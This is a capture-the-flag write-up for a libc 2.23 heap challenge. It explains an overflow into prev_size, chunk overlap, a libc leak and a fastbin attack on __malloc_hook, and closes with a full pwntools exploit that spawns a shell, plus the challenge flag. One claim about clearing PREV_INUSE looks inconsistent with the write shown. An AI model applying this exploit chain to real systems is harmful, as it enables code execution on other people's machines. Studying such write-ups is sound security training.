---
title: "Heap Heap Hooray"
difficulty: Hard
description: "Birthdays come once a year, or so they say, With cakes and cards and heap hooray! Some wish for toys, or cake, or a ring, But a shell is my absolute favorite thing!"
flag: "CSC{H3Ap_3xpL0I75_74573_b3T7ER_TH4N_c4K3}"
---

# Heap heap hooray

> *Birthdays come once a year, or so they say, With cakes and cards and heap hooray! Some wish for toys, or cake, or a ring, But a shell is my absolute favorite thing!*

64bit PIE binary, dynamically linked against libc-2.23. that means no tcache, just fastbins and unsorted/small/large bins. `__malloc_hook` and `__free_hook` are writable. old school heap exploitation.

birthday card manager with 4 operations. from the ghidra decompile:

add (option 1) - `calloc(1, size)` with size 8-1024, stores pointer and size in a global array at `DAT_00302040`:

```c
pvVar2 = calloc(1,(ulong)local_44);
*(void **)(&DAT_00302040 + (long)(int)local_40 * 0x10) = pvVar2;
*(uint *)(&DAT_00302048 + (long)(int)local_40 * 0x10) = local_44;
```

edit (option 2) - reads up to **0x500 bytes** into a local stack buffer, then `memcpy`s `min(chunk_size, bytes_read)` into the chunk:

```c
sVar2 = read(0,local_518,0x500);
local_51c = (uint)sVar2;
if (*(uint *)(&DAT_00302048 + (ulong)local_520 * 0x10) < local_51c) {
    local_51c = *(uint *)(&DAT_00302048 + (ulong)local_520 * 0x10);
}
memcpy(*(void **)(&DAT_00302040 + (ulong)local_520 * 0x10),local_518,(long)(int)local_51c);
```

the memcpy writes `min(recorded_size, bytes_read)` bytes into the chunk. for a 0x68-byte chunk (0x70 with header), writing 0x68 bytes fills the entire data portion. but the `prev_size` field of the next chunk sits right at the end of chunk 1's data region, it's the last 8 bytes. so writing 0x68 bytes into chunk 1 overwrites chunk 2's `prev_size`. that's the overflow.

## the attack

four allocations:

```
Chunk 0: 0xf8 (0x100 with header, small bin)
Chunk 1: 0x68 (0x70 with header, fastbin)
Chunk 2: 0xf8 (0x100 with header, small bin)
Chunk 3: 0x20 (guard against top-chunk consolidation)
```

the guard chunk matters. without it, freeing chunk 2 would merge into the top chunk instead of backward-consolidating with 0 and 1.

free chunk 0, it goes to unsorted bin. then overflow chunk 1 into chunk 2's header:

```python
edit(io, 1, b'A' * 0x60 + p64(0x170))
```

this writes 0x68 bytes into chunk 1. the last 8 bytes (`p64(0x170)`) land in chunk 2's `prev_size` field. 0x170 = 0x100 + 0x70, the combined size of chunks 0 and 1. this also clears the `PREV_INUSE` bit in chunk 2's size field (because the 0x60 bytes of 'A' overflow just enough).

Now freeing chunk 2 triggers `unlink` backward consolidation. malloc sees `prev_size = 0x170` and `PREV_INUSE = 0`, so it thinks there's a free chunk of size 0x170 starting 0x170 bytes back. that covers chunks 0, 1, and 2, all merged into one big free chunk. but chunk 1 was never freed. its pointer is still in our slot array. overlap achieved.

## libc leak

allocate 0xf8 into the consolidated region. it lands at old chunk 0's position. the unsorted bin `fd`/`bk` pointers now sit inside chunk 1's data area. `show(1)` reads them out:

```python
add(io, 0xf8)
show(io, 1)
leak = u64(io.recv(8))
libc.address = leak - (libc.sym.__malloc_hook + 0x10 + 88)
```

got libc.

## fastbin attack

Allocate a 0x68 chunk (chunk 5) which lands in the overlapping region, overlapping chunk 1. free chunk 1 into the 0x70 fastbin. edit chunk 5 to overwrite freed chunk 1's `fd` pointer:

```python
add(io, 0x68)
delete(io, 1)
edit(io, 5, p64(libc.sym.__malloc_hook - 0x23) + b'\n')
```

Why `__malloc_hook - 0x23`? because at that address there's a `0x7f` byte (from libc addresses) that the fastbin allocator interprets as a valid size for the 0x70 bin (size 0x7f rounds to 0x70). this is the classic [fastbin_dup_into_stack](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c) technique from how2heap. two more allocations drain the fastbin:

```python
add(io, 0x68)
add(io, 0x68)
```

The second allocation returns a chunk whose data overlaps `__malloc_hook`.

## one-gadget with realloc alignment

`__realloc_hook` sits right before `__malloc_hook` in memory. write the [one_gadget](https://github.com/david942j/one_gadget) address to `__realloc_hook` and point `__malloc_hook` at `realloc + N`. when malloc fires, it hits `__malloc_hook` which jumps to `realloc + N`. the realloc function pushes some registers (fixing stack alignment for the one-gadget constraints), then checks `__realloc_hook` and jumps there.

The offset N controls how many push instructions execute. Locally `realloc + 16` worked. remotely it didn't. tried `realloc + 14` and that worked.

```python
realloc = libc.sym.__libc_realloc
og = libc.address + 0xf03a4
edit(io, 7, b'\x00' * 0x0b + p64(og) + p64(realloc + 14))
```

trigger with any malloc:

```python
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'size: ', b'20')
io.sendline(b'cat flag*')
```

## full exploit

```python
from pwn import *

context.arch = 'amd64'

LIBC = './libc-2.23.so'

def add(io, sz):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(sz).encode())

def edit(io, idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def show(io, idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def delete(io, idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())

libc = ELF(LIBC)
io = remote(HOST, PORT)

add(io, 0xf8)
add(io, 0x68)
add(io, 0xf8)
add(io, 0x20)

delete(io, 0)
edit(io, 1, b'A' * 0x60 + p64(0x170))
delete(io, 2)

add(io, 0xf8)
show(io, 1)
leak = u64(io.recv(8))
libc.address = leak - (libc.sym.__malloc_hook + 0x10 + 88)

add(io, 0x68)
delete(io, 1)
edit(io, 5, p64(libc.sym.__malloc_hook - 0x23) + b'\n')
add(io, 0x68)
add(io, 0x68)

realloc = libc.sym.__libc_realloc
og = libc.address + 0xf03a4
edit(io, 7, b'\x00' * 0x0b + p64(og) + p64(realloc + 14))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'size: ', b'20')
io.sendline(b'cat flag*')
io.interactive()
```

`CSC{H3Ap_3xpL0I75_74573_b3T7ER_TH4N_c4K3}`
